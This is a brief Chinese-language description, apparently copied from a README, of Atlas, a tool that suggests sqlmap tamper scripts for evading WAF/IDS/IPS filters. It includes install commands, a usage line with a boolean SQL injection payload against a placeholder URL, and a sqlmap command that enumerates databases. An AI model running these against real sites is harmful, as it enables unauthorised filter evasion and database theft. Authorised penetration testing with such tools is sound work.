Atlas是一个开源工具，可以建议sqlmap篡改绕过WAF / IDS / IPS，该工具基于返回的状态代码。  

  

  

![](../Images/b881265383c0349f2e80f510ec2424ee.png)

  
安装  
$ git clone https://github.com/m4ll0k/Atlas.git atlas  
$ cd atlas  
$ python atlas.py用法  
$ python atlas.py --url http://site.com/index.php?id=Price\_ASC --payload="-1234 AND 4321=4321-- AAAA" --dbms=mysql --random-agent -v  

  

  

![](../Images/77ec1de1fb4c0e826432e303317a9e5c.png)

  
示例  
运行SQLMap：  
$ python sqlmap.py -u 'http://site.com/index.php?id=Price\_ASC' --dbs --random-agent -v 3
